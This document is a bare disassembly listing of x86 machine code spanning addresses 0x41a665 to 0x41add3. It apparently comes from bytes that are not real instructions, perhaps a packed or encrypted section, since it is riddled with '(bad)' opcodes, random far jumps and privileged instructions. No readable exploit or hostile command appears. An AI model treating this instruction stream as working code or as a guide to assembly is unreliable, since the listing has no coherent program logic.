  41a665:	je     0x41a6cb
  41a667:	test   eax,0x18790272
  41a66c:	mov    bl,0x84
  41a66e:	dec    esp
  41a66f:	dec    edi
  41a670:	sub    al,0x56
  41a672:	dec    ebp
  41a673:	mov    WORD PTR [edi+0xbcc0249],cs
  41a679:	mov    bh,0xfd
  41a67b:	pop    edi
  41a67c:	mov    bl,0x6b
  41a67e:	retf   
  41a67f:	pop    edi
  41a680:	cmp    bh,BYTE PTR [esp+edi*1]
  41a683:	ins    DWORD PTR es:[edi],dx
  41a684:	sahf   
  41a685:	(bad)  
  41a686:	push   ebp
  41a687:	in     eax,dx
  41a688:	mov    ds:0x346148ae,al
  41a68d:	fcomp  st(2)
  41a68f:	xchg   edi,eax
  41a691:	(bad)  
  41a692:	mul    ah
  41a694:	aas    
  41a695:	sbb    al,0x41
  41a697:	fs and edx,edx
  41a69a:	and    cl,ch
  41a69c:	mul    BYTE PTR [ecx]
  41a69e:	jecxz  0x41a6f7
  41a6a0:	pop    ss
  41a6a1:	addr16 push cs
  41a6a3:	sub    BYTE PTR [ecx+0x9e3d9d9],cl
  41a6a9:	shr    al,1
  41a6ab:	push   eax
  41a6ac:	mov    ds:0x2529870f,eax
  41a6b1:	pop    ebp
  41a6b2:	fnstsw WORD PTR [ecx+ebx*1]
  41a6b5:	mov    ds:0xec72448d,eax
  41a6ba:	lds    ebx,FWORD PTR [esp+eiz*2+0x1c20a32d]
  41a6c1:	fs add eax,0x945f72ad
  41a6c7:	xchg   ebx,eax
  41a6c8:	jo     0x41a663
  41a6ca:	dec    esi
  41a6cb:	or     edx,DWORD PTR [eax-0x77]
  41a6ce:	jno    0x41a679
  41a6d0:	arpl   WORD PTR [eax],di
  41a6d2:	lods   eax,DWORD PTR ds:[esi]
  41a6d3:	adc    ch,BYTE PTR [ebx+0x64565140]
  41a6d9:	cmc    
  41a6da:	ja     0x41a6a1
  41a6dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6dd:	loope  0x41a74e
  41a6df:	sub    al,0xc7
  41a6e1:	jmp    0x43f8:0xa2bbec93
  41a6e8:	(bad)  
  41a6e9:	std    
  41a6ea:	js     0x41a73e
  41a6ec:	inc    eax
  41a6ed:	jnp    0x41a760
  41a6ef:	mov    edi,0x3b68b87d
  41a6f4:	adc    edx,DWORD PTR [edi+0x2c]
  41a6f7:	mov    cl,0x3e
  41a6f9:	in     eax,dx
  41a6fa:	push   cs
  41a6fb:	dec    esi
  41a6fc:	mov    edx,0x323f4ce2
  41a701:	jne    0x41a6d0
  41a703:	mov    ds:0x57942c6d,al
  41a708:	inc    ecx
  41a709:	retf   0x61f1
  41a70c:	ins    DWORD PTR es:[edi],dx
  41a70d:	test   al,0x47
  41a70f:	and    al,0x9e
  41a711:	mov    ch,0x56
  41a713:	push   cs
  41a714:	pop    esi
  41a715:	push   ds
  41a716:	(bad)  
  41a717:	(bad)  
  41a718:	lods   eax,DWORD PTR ds:[esi]
  41a719:	ror    DWORD PTR [edx],1
  41a71b:	gs or  al,0xcf
  41a71e:	push   eax
  41a71f:	test   BYTE PTR [ecx+0x2e],0x26
  41a723:	loopne 0x41a772
  41a725:	push   ebp
  41a726:	dec    esi
  41a727:	inc    ecx
  41a728:	or     BYTE PTR [ebx],bh
  41a72a:	or     BYTE PTR [esi-0x32],0xc3
  41a72e:	call   0xacdb:0x859bc053
  41a735:	jmp    0x385e:0xaf42f2af
  41a73c:	div    BYTE PTR [edi+0x170fa30d]
  41a742:	aaa    
  41a743:	jl     0x41a722
  41a745:	xchg   edx,eax
  41a746:	std    
  41a747:	aas    
  41a748:	(bad)  
  41a749:	sti    
  41a74a:	mov    esp,0x8633b329
  41a74f:	mov    DWORD PTR [eax-0x7ef34bb8],edx
  41a755:	or     al,0x5d
  41a757:	enter  0xeb60,0x85
  41a75b:	or     eax,0xc3b5183f
  41a760:	sbb    al,0x1c
  41a762:	jg     0x41a72c
  41a764:	(bad)  
  41a765:	pop    ebp
  41a766:	mov    ebp,0xf7096be6
  41a76b:	xchg   ebp,eax
  41a76c:	sbb    dl,cl
  41a76e:	xchg   esi,eax
  41a76f:	cmp    dl,BYTE PTR [edx-0x60]
  41a772:	popf   
  41a773:	sti    
  41a774:	cmp    bh,ch
  41a776:	jecxz  0x41a7a4
  41a778:	pop    edi
  41a779:	ins    DWORD PTR es:[edi],dx
  41a77a:	jle    0x41a7f4
  41a77c:	in     eax,dx
  41a77d:	xor    ebp,esi
  41a77f:	mov    esi,0xfe9d77e7
  41a784:	mov    ecx,DWORD PTR ds:0x7e5e354d
  41a78a:	shr    BYTE PTR [edx],0x79
  41a78d:	scas   al,BYTE PTR es:[edi]
  41a78e:	push   edi
  41a78f:	pop    ds
  41a790:	and    DWORD PTR [esi],eax
  41a792:	jl     0x41a75d
  41a794:	adc    DWORD PTR [ebp-0x473a195c],ebx
  41a79a:	shr    edi,cl
  41a79c:	out    dx,al
  41a79d:	dec    edx
  41a79e:	add    DWORD PTR [ebp-0x51db9a19],esp
  41a7a4:	inc    edi
  41a7a5:	xchg   edi,eax
  41a7a6:	cs pop edi
  41a7a8:	jne    0x41a7a4
  41a7aa:	jge    0x41a7b6
  41a7ac:	lods   eax,DWORD PTR ds:[esi]
  41a7ad:	sbb    esi,DWORD PTR [ebx-0xb]
  41a7b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7b1:	cmp    BYTE PTR [eax-0x45],0x43
  41a7b5:	out    0x4b,al
  41a7b7:	cs out dx,ax
  41a7ba:	mov    es,WORD PTR [esi+esi*4]
  41a7bd:	pop    ss
  41a7be:	loope  0x41a74d
  41a7c0:	xchg   ebx,eax
  41a7c1:	mov    ah,0x23
  41a7c3:	and    ah,BYTE PTR [edi+0x46c5cd87]
  41a7c9:	pop    ecx
  41a7ca:	add    al,0x77
  41a7cc:	cmp    bh,BYTE PTR [esi-0x77f495ae]
  41a7d2:	xchg   ecx,eax
  41a7d3:	test   al,0x99
  41a7d5:	aas    
  41a7d6:	arpl   WORD PTR [esi-0x1d],si
  41a7d9:	sbb    eax,0x4c8f88cc
  41a7de:	fistp  QWORD PTR [ebx-0x35c36c34]
  41a7e4:	mov    ds:0x49b9434d,al
  41a7e9:	dec    ebx
  41a7ea:	sub    bl,BYTE PTR ds:0xf4376b04
  41a7f0:	adc    ah,cl
  41a7f2:	xchg   BYTE PTR [ebp+0x6],ah
  41a7f5:	js     0x41a78e
  41a7f7:	add    eax,0x82cec9f2
  41a7fc:	push   esp
  41a7fd:	or     ecx,DWORD PTR [esi]
  41a7ff:	xchg   edi,eax
  41a800:	and    bl,BYTE PTR [edx]
  41a802:	jno    0x41a7c5
  41a804:	jmp    0xc8c1:0x1dc72dc6
  41a80b:	pop    ecx
  41a80c:	gs int 0x6
  41a80f:	repnz xchg ecx,eax
  41a811:	inc    edi
  41a812:	push   ebp
  41a813:	add    BYTE PTR [esi],ah
  41a815:	pushf  
  41a816:	xchg   edx,eax
  41a817:	in     al,dx
  41a818:	push   edx
  41a819:	test   edx,eax
  41a81b:	sbb    DWORD PTR [edx-0x28],esp
  41a81e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a81f:	(bad)  
  41a820:	lahf   
  41a821:	rcr    BYTE PTR [ebx+0x68631313],0xad
  41a828:	or     ebp,DWORD PTR [ecx+0x111ae49b]
  41a82e:	sbb    al,0x40
  41a830:	push   ebx
  41a831:	sbb    al,0x25
  41a833:	mov    ebx,0xa749ba77
  41a838:	push   edi
  41a839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a83a:	jle    0x41a7bf
  41a83c:	mov    eax,0x76effe9d
  41a841:	imul   esi,edi,0xb22abe31
  41a847:	jle    0x41a8ad
  41a849:	repnz retf 0x768b
  41a84d:	into   
  41a84e:	pushf  
  41a84f:	repz push ss
  41a851:	mov    ebx,0xef5d6a47
  41a856:	xchg   edi,eax
  41a857:	xor    al,0x21
  41a859:	pusha  
  41a85a:	ins    DWORD PTR es:[edi],dx
  41a85b:	sbb    dl,BYTE PTR [ebx-0x9a0009]
  41a861:	hlt    
  41a862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a863:	jmp    0x3cac0fb4
  41a868:	sbb    bl,BYTE PTR [edi+0x1e]
  41a86b:	mov    ds:0x14c87285,eax
  41a870:	inc    edx
  41a871:	call   0x9a1db8e8
  41a876:	xor    BYTE PTR [edi],0xd4
  41a879:	xchg   ebp,eax
  41a87a:	inc    ebp
  41a87b:	add    eax,0x78d07d0f
  41a880:	ins    BYTE PTR es:[edi],dx
  41a881:	bound  edx,QWORD PTR [edx-0x15640ecb]
  41a887:	addr16 pop es
  41a889:	xchg   DWORD PTR ds:0x640c64,ecx
  41a88f:	(bad)  
  41a890:	xor    ah,BYTE PTR [esi-0x5302242d]
  41a896:	into   
  41a897:	les    esp,FWORD PTR [ebx]
  41a899:	xlat   BYTE PTR ds:[ebx]
  41a89a:	data16 in al,0x3c
  41a89d:	mov    ds:0xb6e86f83,al
  41a8a2:	iret   
  41a8a3:	mov    dl,0x81
  41a8a5:	dec    ecx
  41a8a6:	cmp    BYTE PTR [ecx-0x3cde71df],0xae
  41a8ad:	cmp    DWORD PTR [ebp-0x202618b],ecx
  41a8b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8b4:	xchg   ecx,eax
  41a8b5:	push   cs
  41a8b6:	mov    BYTE PTR [edi-0x5c9c4767],cl
  41a8bc:	lahf   
  41a8bd:	mov    ds:0x88d42879,al
  41a8c2:	jb     0x41a864
  41a8c4:	sub    al,dl
  41a8c6:	sbb    eax,0x89ca5d35
  41a8cb:	test   BYTE PTR [edx-0x45e83b25],bh
  41a8d1:	pop    ss
  41a8d2:	outs   dx,BYTE PTR ds:[esi]
  41a8d3:	mov    ch,0x1f
  41a8d5:	xor    BYTE PTR [eax-0x57],ch
  41a8d8:	sti    
  41a8d9:	push   cs
  41a8da:	jmp    0x42287cfb
  41a8df:	mov    ebx,0x59f7fe13
  41a8e4:	pusha  
  41a8e5:	aam    0xcd
  41a8e7:	mov    ds:0x330d9a76,eax
  41a8ec:	sub    ebp,DWORD PTR [edi-0x4e8bb366]
  41a8f2:	push   edx
  41a8f3:	rcl    esi,1
  41a8f5:	fimul  DWORD PTR [eax-0x2a]
  41a8f8:	sub    BYTE PTR [ebp+0x77],bl
  41a8fb:	outs   dx,DWORD PTR ds:[esi]
  41a8fc:	nop
  41a8fd:	in     al,dx
  41a8fe:	imul   DWORD PTR [esi-0x73d69182]
  41a904:	adc    al,0x46
  41a906:	dec    DWORD PTR [ecx]
  41a908:	aam    0xb1
  41a90a:	mov    edx,0x16ba2045
  41a90f:	mul    BYTE PTR [eax+0x68]
  41a912:	sbb    edx,ebp
  41a914:	loopne 0x41a91c
  41a916:	xor    BYTE PTR ds:0x614fa962,ah
  41a91c:	fcomp  QWORD PTR [ecx-0x510b98c7]
  41a922:	mov    esp,0x26a049a8
  41a927:	test   eax,0x225b92a5
  41a92c:	das    
  41a92d:	inc    ebx
  41a92e:	cld    
  41a92f:	or     bl,BYTE PTR [ebx]
  41a931:	sahf   
  41a932:	xchg   BYTE PTR [ecx+0x4b],dh
  41a935:	(bad)  
  41a936:	std    
  41a937:	mov    bh,0xc6
  41a939:	pusha  
  41a93a:	xor    DWORD PTR ds:0xf6d6443e,eax
  41a940:	mov    DWORD PTR [eax+ebp*2-0x4480b0a8],edi
  41a947:	jno    0x41a8e7
  41a949:	push   0x3a11e6ca
  41a94e:	adc    esp,DWORD PTR [edx+0x15fee578]
  41a954:	in     eax,0xbf
  41a956:	jmp    0x4105bbf
  41a95b:	sbb    dl,BYTE PTR [edi+0x710cc652]
  41a961:	xor    ch,BYTE PTR [esi+0x371ecbdf]
  41a967:	sbb    BYTE PTR [edx-0x37],0x8
  41a96b:	ja     0x41a92c
  41a96d:	ret    0x5b36
  41a970:	ja     0x41a9cb
  41a972:	mov    ebx,0x209b05c7
  41a977:	daa    
  41a978:	fs dec edi
  41a97a:	xchg   esi,eax
  41a97b:	rcr    BYTE PTR [edi],cl
  41a97d:	jmp    0xed5a:0xef2dca7c
  41a984:	inc    ebx
  41a985:	jnp    0x41a9e2
  41a987:	popf   
  41a988:	cmp    edi,ebp
  41a98a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a98b:	push   edi
  41a98c:	and    esp,DWORD PTR [edx+0x1dc2c80b]
  41a992:	xor    dh,ah
  41a994:	pop    edi
  41a995:	sbb    ebx,ecx
  41a997:	sar    DWORD PTR [ebp-0x3573aa60],1
  41a99d:	xor    ebx,edi
  41a99f:	pushf  
  41a9a0:	in     al,0xc9
  41a9a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9a3:	push   ebx
  41a9a4:	retf   
  41a9a5:	popa   
  41a9a6:	adc    bh,BYTE PTR [edi+edx*2-0x57c8d52b]
  41a9ad:	inc    edi
  41a9ae:	xchg   edx,eax
  41a9af:	push   ss
  41a9b0:	or     eax,0xac5cf36e
  41a9b5:	mov    bl,0x18
  41a9b7:	and    DWORD PTR [ebx+eiz*8+0x4a],0xec31d554
  41a9bf:	dec    ebp
  41a9c0:	fs ja  0x41a9a5
  41a9c3:	xor    eax,0x1ad5b6da
  41a9c8:	adc    eax,0x8abed6af
  41a9cd:	pop    DWORD PTR [edx-0x12247d44]
  41a9d3:	dec    edi
  41a9d4:	jp     0x41a9fd
  41a9d6:	or     al,0x84
  41a9d8:	dec    eax
  41a9d9:	loop   0x41a9da
  41a9db:	std    
  41a9dc:	jge    0x41aa15
  41a9de:	sar    BYTE PTR [ebx],0x30
  41a9e1:	sbb    ebp,DWORD PTR [edi]
  41a9e3:	pop    esi
  41a9e4:	scas   eax,DWORD PTR es:[edi]
  41a9e5:	mov    esi,DWORD PTR [edi-0x2d]
  41a9e8:	retf   0xd978
  41a9eb:	or     edx,DWORD PTR [ecx+0x4d]
  41a9ee:	mov    edi,0x8a1980e3
  41a9f3:	adc    eax,0x68d3f472
  41a9f8:	mov    dl,0x3c
  41a9fa:	mov    edi,0x46026c7c
  41a9ff:	mov    ds:0xe8185df4,al
  41aa04:	mov    BYTE PTR ds:0x63b57f31,bl
  41aa0a:	ret    0x7c97
  41aa0d:	sbb    ch,BYTE PTR [edx-0x22694e6f]
  41aa13:	(bad)  [esi]
  41aa15:	and    bl,cl
  41aa17:	mov    dh,0x97
  41aa19:	addr16 (bad) 
  41aa1b:	je     0x41a9c7
  41aa1d:	iret   
  41aa1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa1f:	xlat   BYTE PTR ds:[ebx]
  41aa20:	retf   0x89d7
  41aa23:	popf   
  41aa24:	xchg   DWORD PTR [eax+0xf],esi
  41aa27:	or     BYTE PTR [edx+0x2b63a999],bl
  41aa2d:	mov    BYTE PTR [ebp-0x2c98d7b1],dl
  41aa33:	aaa    
  41aa34:	mov    ds,WORD PTR [esp+eiz*2+0x2b]
  41aa38:	add    al,dh
  41aa3a:	or     al,0xbb
  41aa3c:	js     0x41aaaa
  41aa3e:	cmp    ecx,DWORD PTR [edx+0x1322d9c8]
  41aa44:	inc    ecx
  41aa45:	loopne 0x41aa02
  41aa47:	enter  0x6ee5,0x94
  41aa4b:	mov    bl,0x3c
  41aa4d:	arpl   WORD PTR [edi-0xa],ax
  41aa50:	cwde   
  41aa51:	gs pop ecx
  41aa53:	cmc    
  41aa54:	jg     0x41aa74
  41aa56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa57:	imul   esi,DWORD PTR [esi],0x65
  41aa5a:	imul   esi,esp,0x5f
  41aa5d:	jmp    0x3f500e91
  41aa62:	daa    
  41aa63:	das    
  41aa64:	jo     0x41aa2f
  41aa66:	xor    eax,0xf8ba1e8e
  41aa6b:	aad    0xd8
  41aa6d:	dec    ebp
  41aa6e:	dec    edx
  41aa6f:	or     DWORD PTR [ebp+0x17],ecx
  41aa72:	push   eax
  41aa74:	shr    BYTE PTR [esp+edx*4+0x6c80535a],1
  41aa7b:	fcom   QWORD PTR [ebp+eiz*8+0x34]
  41aa7f:	and    DWORD PTR [di-0x18e6],eax
  41aa84:	and    ecx,DWORD PTR [ebp+0x47]
  41aa87:	je     0x41aa48
  41aa89:	jmp    0x53c6:0x438054da
  41aa90:	add    ecx,ebp
  41aa92:	jl     0x41aaba
  41aa94:	push   edx
  41aa95:	hlt    
  41aa96:	sub    DWORD PTR [ebp-0x38d67a2d],ebp
  41aa9c:	inc    ebp
  41aa9d:	ror    ch,cl
  41aa9f:	out    dx,al
  41aaa0:	mov    ds:0x712e5ca3,eax
  41aaa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaa6:	mov    ebx,0xf5b5d7f6
  41aaab:	and    DWORD PTR [ebx+0x78],0xe3a5d228
  41aab2:	sub    DWORD PTR [ecx-0x12],0x2b
  41aab6:	es pushf 
  41aab8:	bound  edi,QWORD PTR [edx+0x31515202]
  41aabe:	lods   eax,DWORD PTR ds:[esi]
  41aabf:	mov    eax,ds:0xdbb8470e
  41aac4:	and    eax,0xa51f3cc1
  41aac9:	in     al,0xd
  41aacb:	xchg   BYTE PTR [ecx+0x2c9c5eee],al
  41aad1:	das    
  41aad2:	and    ebp,DWORD PTR [eax]
  41aad4:	int3   
  41aad5:	lahf   
  41aad6:	popa   
  41aad7:	scas   eax,DWORD PTR es:[edi]
  41aad8:	scas   eax,DWORD PTR es:[edi]
  41aad9:	mov    esi,0x1ef4b709
  41aade:	add    eax,0xfe43e673
  41aae3:	call   0x4d42a777
  41aae8:	sub    esi,DWORD PTR [esi+0x6d]
  41aaeb:	aaa    
  41aaec:	pop    edx
  41aaed:	jbe    0x41ab2e
  41aaef:	jmp    0x6415d4c9
  41aaf4:	popa   
  41aaf5:	scas   eax,DWORD PTR es:[edi]
  41aaf6:	cmp    ah,dh
  41aaf8:	std    
  41aaf9:	add    BYTE PTR [eax],bh
  41aafb:	lea    ebp,[ebp+0x57]
  41aafe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaff:	dec    eax
  41ab00:	add    BYTE PTR [edx],dh
  41ab02:	mov    dl,bl
  41ab04:	fnstsw WORD PTR [edi]
  41ab06:	xchg   esp,eax
  41ab07:	bound  edi,QWORD PTR [edx+0x7]
  41ab0a:	xchg   esp,eax
  41ab0b:	cs out dx,eax
  41ab0d:	mov    ah,BYTE PTR [eax]
  41ab0f:	xchg   edx,eax
  41ab10:	dec    eax
  41ab11:	ret    0xfa63
  41ab14:	ror    BYTE PTR [edx+0x588bcd58],1
  41ab1a:	shl    DWORD PTR [esi-0x5a],1
  41ab1d:	adc    al,0x3c
  41ab1f:	call   0xbc513779
  41ab24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab25:	aam    0xed
  41ab27:	jmp    0x580aa609
  41ab2c:	adc    bh,BYTE PTR [ecx-0x49]
  41ab2f:	fst    DWORD PTR [eax-0x8]
  41ab32:	inc    eax
  41ab33:	into   
  41ab34:	mov    ds:0xea5e1b9a,al
  41ab39:	cmp    bl,BYTE PTR [ecx]
  41ab3b:	adc    esp,eax
  41ab3d:	neg    BYTE PTR [ebx+edi*1-0x1a0e3811]
  41ab44:	clc    
  41ab45:	scas   al,BYTE PTR es:[edi]
  41ab46:	int    0x14
  41ab48:	xchg   esi,eax
  41ab49:	fs test al,0x74
  41ab4c:	mov    DWORD PTR [ebx],0xbb619b84
  41ab52:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41ab54:	or     BYTE PTR [edi],ah
  41ab56:	fcomp  QWORD PTR [ebx-0x642bb3ea]
  41ab5c:	dec    ebp
  41ab5d:	push   ebp
  41ab5e:	cmp    bh,BYTE PTR [edx-0x73]
  41ab61:	int3   
  41ab62:	repz ret 
  41ab64:	sahf   
  41ab65:	jmp    0x85b0a37d
  41ab6a:	dec    esp
  41ab6b:	sub    al,0x89
  41ab6d:	xchg   edi,eax
  41ab6e:	loope  0x41ab95
  41ab70:	es pop ds
  41ab72:	imul   ebx,DWORD PTR [ecx-0x45e61472],0xdc311a53
  41ab7c:	mov    cl,0x2f
  41ab7e:	lods   eax,DWORD PTR ds:[esi]
  41ab7f:	stc    
  41ab80:	dec    esp
  41ab81:	inc    ecx
  41ab82:	fucom  st(6)
  41ab84:	or     edi,DWORD PTR [ebp-0x447cd017]
  41ab8a:	retf   0xb220
  41ab8d:	adc    ch,ch
  41ab8f:	push   cs
  41ab90:	cmp    ebx,ebp
  41ab92:	pop    eax
  41ab93:	gs bnd jnp 0x41abff
  41ab97:	xor    al,0xa2
  41ab99:	mov    ebp,0x85924f08
  41ab9e:	jge    0x41ac0c
  41aba0:	jl     0x41ac1c
  41aba2:	push   0xffffff93
  41aba4:	mov    ch,0xd6
  41aba6:	rcl    BYTE PTR [edx],cl
  41aba8:	xchg   ecx,eax
  41aba9:	mov    ds:0x8d8f19e3,al
  41abae:	and    al,BYTE PTR [eax+0x47]
  41abb1:	fdiv   st,st(1)
  41abb3:	call   0xb530:0xd797bc97
  41abba:	cdq    
  41abbb:	sbb    dl,cl
  41abbd:	or     edi,DWORD PTR [edi+0x1a28598b]
  41abc3:	repnz pop es
  41abc5:	aaa    
  41abc6:	adc    DWORD PTR ds:0xe7cd25f7,0x69d4a19b
  41abd0:	and    BYTE PTR [ebp+0x50d6aff5],cl
  41abd6:	gs inc ecx
  41abd8:	cwde   
  41abd9:	fs inc ebx
  41abdb:	repnz push ecx
  41abdd:	adc    eax,0xdb2b5dfc
  41abe2:	aam    0xc5
  41abe4:	cld    
  41abe5:	jg     0x41abc9
  41abe7:	int    0xb8
  41abe9:	arpl   WORD PTR [ebx],bx
  41abeb:	fs (bad) 
  41abee:	inc    edi
  41abef:	cmp    DWORD PTR [edi-0x735acce3],esp
  41abf5:	ins    BYTE PTR es:[edi],dx
  41abf6:	arpl   WORD PTR [ecx+0x2f],cx
  41abf9:	or     ecx,DWORD PTR [edi]
  41abfb:	add    al,0xd2
  41abfd:	sbb    dh,BYTE PTR [ebp+0x1e]
  41ac00:	inc    edx
  41ac01:	mov    esi,0x75cb559a
  41ac06:	mov    eax,0xc6c2b8d9
  41ac0b:	inc    esp
  41ac0c:	dec    edi
  41ac0d:	leave  
  41ac0e:	xor    ch,dl
  41ac10:	sub    eax,0xb36a72c
  41ac15:	int    0x71
  41ac17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac18:	nop
  41ac19:	xchg   ecx,eax
  41ac1a:	push   ebp
  41ac1b:	xor    DWORD PTR [ebx-0x46],esi
  41ac1e:	sub    al,0x6
  41ac20:	data16 shl BYTE PTR [ebx+0x43],0x96
  41ac25:	adc    edi,ebx
  41ac27:	leave  
  41ac28:	lock test DWORD PTR [ecx+0x44],esp
  41ac2c:	add    DWORD PTR ds:0x72cb7354,esp
  41ac32:	jmp    0xed84:0x440c61b5
  41ac39:	jnp    0x41abd4
  41ac3b:	imul   esi,eax,0xffffffb3
  41ac3e:	loopne 0x41abd4
  41ac40:	mov    dh,0xf9
  41ac42:	push   cs
  41ac43:	mov    ah,0xd4
  41ac45:	cmp    eax,0x79097f71
  41ac4a:	ja     0x41ac91
  41ac4c:	neg    DWORD PTR [eax-0x3c]
  41ac4f:	xchg   edi,eax
  41ac50:	je     0x41ac44
  41ac52:	adc    eax,0x621e56d4
  41ac57:	pushf  
  41ac58:	fs pop edx
  41ac5a:	ret    
  41ac5b:	xor    eax,0x95140197
  41ac60:	cmp    DWORD PTR [edx+eiz*2-0x69],0x797389d0
  41ac68:	xchg   esp,eax
  41ac69:	pop    es
  41ac6a:	dec    esp
  41ac6b:	fld    DWORD PTR [edx]
  41ac6d:	shr    DWORD PTR [ecx],cl
  41ac6f:	mov    esp,0xee7fc244
  41ac74:	popf   
  41ac75:	sbb    al,0xfd
  41ac77:	adc    ebp,DWORD PTR [ebx]
  41ac79:	cmp    esp,edx
  41ac7b:	dec    ebp
  41ac7c:	stos   DWORD PTR es:[edi],eax
  41ac7d:	pop    es
  41ac7e:	stc    
  41ac7f:	jle    0x41acfa
  41ac81:	lea    ebx,[ecx]
  41ac83:	loope  0x41ac79
  41ac85:	(bad)  
  41ac86:	pushf  
  41ac87:	(bad)  
  41ac88:	loop   0x41ac80
  41ac8a:	in     al,dx
  41ac8b:	retf   
  41ac8c:	out    0xbb,al
  41ac8e:	ds popa 
  41ac90:	and    eax,0x56b34721
  41ac95:	pop    ebx
  41ac96:	fsub   QWORD PTR [edx+eax*2-0x37]
  41ac9a:	addr16 inc esp
  41ac9c:	pop    edi
  41ac9d:	pop    esp
  41ac9e:	dec    ecx
  41ac9f:	lea    eax,ss:[ebp+eiz*2+0xd30e8f2]
  41aca7:	mov    ds:0x1bbeb3c2,eax
  41acac:	jne    0x41acb0
  41acae:	mov    bl,0xc4
  41acb0:	adc    DWORD PTR [eax+0x3fa543d8],ebp
  41acb6:	sbb    eax,0x859fc3ee
  41acbb:	push   ss
  41acbc:	mov    bh,0xab
  41acbe:	(bad)  
  41acbf:	ret    0x51f9
  41acc2:	dec    eax
  41acc3:	daa    
  41acc4:	push   ebx
  41acc5:	clc    
  41acc6:	ja     0x41ace4
  41acc8:	mov    ebp,0xd35e1a9f
  41accd:	out    dx,al
  41acce:	push   ds
  41accf:	inc    eax
  41acd0:	div    BYTE PTR [edi-0x5e]
  41acd3:	mov    ds:0x5cb741d1,al
  41acd8:	test   eax,0x9fd8a695
  41acdd:	pusha  
  41acde:	fwait
  41acdf:	or     BYTE PTR [esi+0x17],bl
  41ace2:	cmp    BYTE PTR [esi],cl
  41ace4:	(bad)  [ecx]
  41ace6:	bound  ebx,QWORD PTR [ebx+0x1a6d7b9a]
  41acec:	jecxz  0x41ac7d
  41acee:	(bad)  
  41acef:	fild   DWORD PTR [ecx-0x6]
  41acf2:	add    eax,0x4cab69f
  41acf7:	xor    eax,0x5009cf5c
  41acfc:	cmp    BYTE PTR [ecx],dh
  41acfe:	sahf   
  41acff:	fs jg  0x41ac95
  41ad02:	mov    eax,DWORD PTR [ecx]
  41ad04:	sub    DWORD PTR [ecx+0x75],esi
  41ad07:	add    ecx,edi
  41ad09:	push   es
  41ad0a:	sti    
  41ad0b:	inc    edx
  41ad0c:	leave  
  41ad0d:	mov    BYTE PTR [ebx+0x4f],cl
  41ad10:	sbb    eax,esp
  41ad12:	adc    bl,dh
  41ad14:	cld    
  41ad15:	js     0x41ad87
  41ad17:	sbb    DWORD PTR [eax+0x45744bb4],esi
  41ad1d:	and    al,BYTE PTR [edx-0x548e0966]
  41ad23:	jg     0x41ad02
  41ad25:	cmp    BYTE PTR [ecx+0x35c47c79],bl
  41ad2b:	out    dx,eax
  41ad2c:	pop    ds
  41ad2d:	xchg   ebp,eax
  41ad2e:	mov    bl,BYTE PTR [ecx+0x44]
  41ad31:	sti    
  41ad32:	outs   dx,BYTE PTR ds:[esi]
  41ad33:	fwait
  41ad34:	cwde   
  41ad35:	fwait
  41ad36:	adc    BYTE PTR [eax+ecx*1-0x5e],0x2b
  41ad3b:	and    al,BYTE PTR [ecx+0x1e76ded8]
  41ad41:	inc    edi
  41ad42:	mov    ds:0x7212aa60,eax
  41ad47:	xor    BYTE PTR [esi+0x56ea0372],0x1
  41ad4e:	xor    ecx,edi
  41ad50:	mov    esp,ss
  41ad52:	sbb    al,0x5a
  41ad54:	in     al,dx
  41ad55:	outs   dx,DWORD PTR ds:[esi]
  41ad56:	xchg   esp,eax
  41ad57:	dec    edi
  41ad58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad59:	icebp  
  41ad5a:	test   DWORD PTR ds:0x8cd8eb01,eax
  41ad60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad61:	adc    eax,0x99dc8f88
  41ad66:	xor    bh,bh
  41ad68:	mov    ds:0xff601f7,al
  41ad6d:	inc    esi
  41ad6e:	push   0xfffffffc
  41ad70:	pop    ss
  41ad71:	or     edx,ecx
  41ad73:	push   ds
  41ad74:	xchg   DWORD PTR ds:0xead9a4c7,ebp
  41ad7a:	jo     0x41ad88
  41ad7c:	mov    bl,0x91
  41ad7e:	enter  0x6158,0x6d
  41ad82:	lods   eax,DWORD PTR ds:[esi]
  41ad83:	aam    0xac
  41ad85:	cdq    
  41ad86:	sub    al,0x53
  41ad88:	sbb    ebx,DWORD PTR [ecx+0x4]
  41ad8b:	mov    edi,0x9237f9bf
  41ad90:	mov    ebp,0xe0c79566
  41ad95:	mov    ch,0xbd
  41ad97:	ds popa 
  41ad99:	loop   0x41ad45
  41ad9b:	sbb    eax,DWORD PTR [edi-0x4]
  41ad9e:	push   esi
  41ad9f:	sbb    edi,DWORD PTR [ebp+0x42d692af]
  41ada5:	push   cs
  41ada6:	js     0x41ad94
  41ada8:	push   eax
  41ada9:	pop    esi
  41adaa:	xor    bh,cl
  41adac:	cmp    BYTE PTR [ebx+edx*1],ch
  41adaf:	cmp    esi,edx
  41adb1:	loope  0x41ae00
  41adb3:	sbb    BYTE PTR [ecx+0x36],bl
  41adb6:	xchg   esp,eax
  41adb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adb8:	scas   al,BYTE PTR es:[edi]
  41adb9:	mov    ah,0x6b
  41adbb:	inc    esp
  41adbc:	push   cs
  41adbd:	push   es
  41adbe:	icebp  
  41adbf:	(bad)  
  41adc0:	cmp    eax,0x866f8741
  41adc5:	aam    0x99
  41adc7:	sub    DWORD PTR [ecx+0x2202066c],edi
  41adcd:	mov    edi,esi
  41adcf:	popa   
  41add0:	xor    al,0x71
  41add2:	outs   dx,DWORD PTR ds:[esi]
  41add3:	stos   BYTE PTR es:[edi],al
